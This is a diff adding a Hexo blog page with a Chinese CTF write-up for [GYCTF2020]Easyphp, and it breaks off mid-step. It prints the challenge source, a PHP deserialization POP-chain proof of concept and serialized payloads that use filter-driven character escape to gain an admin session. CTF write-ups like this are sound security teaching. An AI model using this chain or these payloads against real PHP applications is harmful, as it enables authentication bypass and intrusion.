@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="odiws">
+
+
+
+
+
+<title>[GYCTF2020]Easyphp | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">[GYCTF2020]Easyphp</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">odiws</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">August 6, 2024&nbsp;&nbsp;12:05:13</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">刷题笔记</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><h4 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h4><h5 id="www-zip源码泄露"><a href="#www-zip源码泄露" class="headerlink" title="www.zip源码泄露"></a><a target="_blank" rel="noopener" href="http://www.zip源码泄露/">www.zip源码泄露</a></h5><h5 id="PHP反序列化链POC"><a href="#PHP反序列化链POC" class="headerlink" title="PHP反序列化链POC"></a>PHP反序列化链POC</h5><h5 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h5><h3 id="WP"><a href="#WP" class="headerlink" title="WP:"></a>WP:</h3><p>进入环境，题目是easyphp我就感觉要审源码。。。试了一下常见的泄露，发现存在<a href="http://www.zip。把代码下载下来进行一下审计，发现update.php和lib.php可以利用：">www.zip。把代码下载下来进行一下审计，发现update.php和lib.php可以利用：</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">function safe($parm)&#123;</span><br><span class="line">    $array= array(&#x27;union&#x27;,&#x27;regexp&#x27;,&#x27;load&#x27;,&#x27;into&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;insert&#x27;,&quot;&#x27;&quot;,&#x27;\\&#x27;,&quot;*&quot;,&quot;alter&quot;);</span><br><span class="line">    return str_replace($array,&#x27;hacker&#x27;,$parm);</span><br><span class="line">&#125;</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age=null;</span><br><span class="line">    public $nickname=null;</span><br><span class="line">    public function login() &#123;</span><br><span class="line">        if(isset($_POST[&#x27;username&#x27;])&amp;&amp;isset($_POST[&#x27;password&#x27;]))&#123;</span><br><span class="line">            echo &quot;ok&quot;;</span><br><span class="line">            $mysqli=new dbCtrl();</span><br><span class="line">            $this-&gt;id=$mysqli-&gt;login(&#x27;select id,password from user where username=?&#x27;);</span><br><span class="line">            if($this-&gt;id)&#123;</span><br><span class="line">            $_SESSION[&#x27;id&#x27;]=$this-&gt;id;</span><br><span class="line">            $_SESSION[&#x27;login&#x27;]=1;</span><br><span class="line">            echo &quot;你的ID是&quot;.$_SESSION[&#x27;id&#x27;];</span><br><span class="line">            echo &quot;你好！&quot;.$_SESSION[&#x27;token&#x27;];</span><br><span class="line">            echo &quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;;</span><br><span class="line">            return $this-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    public function update()&#123;</span><br><span class="line">        $Info=unserialize($this-&gt;getNewinfo());</span><br><span class="line">        //print_r($Info);</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=new UpdateHelper($_SESSION[&#x27;id&#x27;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#x27;id&#x27;]);</span><br><span class="line">        //这个功能还没有写完 先占坑</span><br><span class="line">    &#125;</span><br><span class="line">    public function getNewInfo()&#123;</span><br><span class="line">        $age=$_POST[&#x27;age&#x27;];</span><br><span class="line">        $nickname=$_POST[&#x27;nickname&#x27;];</span><br><span class="line">        return safe(serialize(new Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        return file_get_contents($this-&gt;nickname);//危</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;nickname-&gt;update($this-&gt;age);</span><br><span class="line">        return &quot;0-0&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Info&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __construct($age,$nickname)&#123;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">        $this-&gt;nickname=$nickname;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($name,$argument)&#123;</span><br><span class="line">        echo $this-&gt;CtrlCase-&gt;login($argument[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $newinfo;</span><br><span class="line">    public $sql;</span><br><span class="line">    public function __construct($newInfo,$sql)&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=new dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        //var_dump($this-&gt;sql);</span><br><span class="line">        echo $this-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $hostname=&quot;127.0.0.1&quot;;</span><br><span class="line">    public $dbuser=&quot;root&quot;;</span><br><span class="line">    public $dbpass=&quot;root&quot;;</span><br><span class="line">    public $database=&quot;test&quot;;</span><br><span class="line">    public $name;</span><br><span class="line">    public $password;</span><br><span class="line">    public $mysqli;</span><br><span class="line">    public $token;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$_POST[&#x27;username&#x27;];</span><br><span class="line">        $this-&gt;password=$_POST[&#x27;password&#x27;];</span><br><span class="line">        $this-&gt;token=$_SESSION[&#x27;token&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($sql)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);</span><br><span class="line">        if ($this-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=$this-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(&#x27;s&#x27;, $this-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        if ($this-&gt;token==&#x27;admin&#x27;) &#123;</span><br><span class="line">            return $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!$idResult) &#123;</span><br><span class="line">            echo(&#x27;用户不存在!&#x27;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if (md5($this-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            echo(&#x27;密码错误！&#x27;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[&#x27;token&#x27;]=$this-&gt;name;</span><br><span class="line">        return $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    public function update($sql)</span><br><span class="line">    &#123;</span><br><span class="line">        //还没来得及写</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">update.php</span><br><span class="line">&lt;?php</span><br><span class="line">require_once(&#x27;lib.php&#x27;);</span><br><span class="line">echo &#x27;&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;update&lt;/title&gt;</span><br><span class="line">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span><br><span class="line">&lt;/html&gt;&#x27;;</span><br><span class="line">if ($_SESSION[&#x27;login&#x27;]!=1)&#123;</span><br><span class="line">	echo &quot;你还没有登陆呢！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$users=new User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line">if($_SESSION[&#x27;login&#x27;]===1)&#123;</span><br><span class="line">	require_once(&quot;flag.php&quot;);</span><br><span class="line">	echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>update.php那里只是输出你没登录，接下来的代码还会执行。update()方法中会进行反序列化。</p>
+<p>update.php那里只是输出你没登录，接下来的代码还会执行。update()方法中会进行反序列化。</p>
+<p>简单的理一下POC的思路。本以为是利用User类的__construct方法来读flag.php，但是发现safe()过滤了flag和\，因此会被过滤，无法读取。<br>但是UpdateHelper类中也有一个__destruct()方法，会echo。</p>
+<p>正好User类存在__toString()方法：</p>
+<p>再利用$this-&gt;nickname-&gt;update()去触发Info类的__call()：</p>
+<p>这样就可以调用一个login方法。但是怎么得flag？<br>lib.php中有2个login方法，User类得login方法可以让$_SESSION[‘login’]&#x3D;1，但是必须返回了id：</p>
+<p>跟进一下第16行得login方法，看一下逻辑：</p>
+<p>想要正常返回$idResult，要么$this-&gt;token&#x3D;&#x3D;’admin’，要么就是查对了用户名和密码才可以。</p>
+<p>这时候便很自然得可以想到思路了，因为反序列化得时候除了User类中login的这里不可控，其他基本都是可控的。：</p>
+<p>也就是说，要分2次。第一次反序列化最终调用的是dbCtrl类的login，因为这里的sql语句和dbCtrl都可控，因此可以成功的$_SESSION[‘token’]&#x3D;$this-&gt;name;。控一下name，让它是admin。</p>
+<p>（更正，其实并不需要第二次反序列化，直接第一次反序列化设了session后，直接随便登录一下，用户名是admin即可，就可以触发user类的login方法了，不需要这里再反序列化构造来触发User类的login方法，我实际上也是思路太局限了。）</p>
+<p>第二次反序列化最终调用User类的login方法。因为这里：</p>
+<p>所以这时候$this-&gt;token&#x3D;’admin’，即这里满足，可以成功查到id：</p>
+<p>这样可以$_SESSION[‘login’]&#x3D;1;</p>
+<p>得到flag：</p>
+<p>接下来就要想办法构造POC了，先是第一次反序列化：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Info&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;age = &quot;1&quot;;</span><br><span class="line">        $this-&gt;nickname = &quot;2&quot;;</span><br><span class="line">        $this-&gt;CtrlCase=new dbCtrl();</span><br><span class="line">        //$this-&gt;CtrlCase=new User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id=&quot;1&quot;;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;age=&#x27;select &quot;1&quot;,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;;</span><br><span class="line">        $this-&gt;nickname=new Info();</span><br><span class="line">        //$this-&gt;nickname-&gt;CtrlCase=new User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    public $sql;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $hostname=&quot;127.0.0.1&quot;;</span><br><span class="line">    public $dbuser=&quot;root&quot;;</span><br><span class="line">    public $dbpass=&quot;root&quot;;</span><br><span class="line">    public $database=&quot;test&quot;;</span><br><span class="line">    public $name=&quot;admin&quot;;</span><br><span class="line">    public $password=&quot;1&quot;;</span><br><span class="line">    public $mysqli;</span><br><span class="line">    public $token;</span><br><span class="line">    public $feng;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;feng=new UpdateHelper();</span><br><span class="line">        //$this-&gt;token=&quot;admin&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Info();</span><br><span class="line">//$a-&gt;CtrlCase=new dbCtrl();</span><br><span class="line">$a-&gt;CtrlCase-&gt;feng-&gt;sql=new User();</span><br><span class="line">//$a-&gt;CtrlCase-&gt;feng-&gt;sql-&gt;nickname-&gt;CtrlCase=new User();</span><br><span class="line">//var_dump($a-&gt;CtrlCase-&gt;feng-&gt;sql-&gt;nickname);</span><br><span class="line">//var_dump($a);</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
+
+<p>需要注意之所以new UpdateHelper()没有写在Info类中，而是写在$this-&gt;CtrlCase中，是因为这里：</p>
+<pre><code>public function update()&#123;
+    $Info=unserialize($this-&gt;getNewinfo());
+    //print_r($Info);
+    $age=$Info-&gt;age;
+    $nickname=$Info-&gt;nickname;
+    $updateAction=new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#39;id&#39;]);
+    //这个功能还没有写完 先占坑
+&#125;
+如果$this-&gt;age或者$this-&gt;nickname设成UpdateHelper的话，会因为把类对象当成字符产而报错。
+产生的payload是这样：
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:1:&quot;2&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:9:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;s:4:&quot;feng&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;s:72:&quot;select &quot;1&quot;,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:1:&quot;2&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:9:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;s:4:&quot;feng&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;N;&#125;&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>通过反序列化字符逃逸，得到这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:901:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker1&quot;;s:8:&quot;nickname&quot;;s:1:&quot;2&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:9:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;s:4:&quot;feng&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;s:72:&quot;select &quot;1&quot;,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:1:&quot;2&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:9:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;s:4:&quot;feng&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;N;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&quot;;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>post传参：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 